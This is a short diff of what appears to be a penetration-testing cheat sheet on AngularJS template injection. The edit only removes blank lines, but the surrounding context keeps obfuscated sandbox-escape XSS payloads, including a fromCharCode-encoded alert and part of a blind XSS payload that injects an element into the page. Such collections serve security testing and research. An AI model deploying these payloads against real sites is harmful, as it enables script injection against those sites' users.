@@ -157,7 +157,6 @@ AngularJS (without `'` single and `"` double quotes) by [@Viren](https://twitter
 {{x=valueOf.name.constructor.fromCharCode;constructor.constructor(x(97,108,101,114,116,40,49,41))()}}
 ```
 
-
 ### Blind XSS
 
 1.0.1 - 1.1.5 && > 1.6.0 by Mario Heiderich (Cure53)
@@ -169,7 +168,6 @@ AngularJS (without `'` single and `"` double quotes) by [@Viren](https://twitter
     document.getElementsByTagName('body')[0].appendChild(_)")()
 }}
 ```
-
 
 Shorter 1.0.1 - 1.1.5 && > 1.6.0 by Lewis Ardern (Synopsys) and Gareth Heyes (PortSwigger)
 
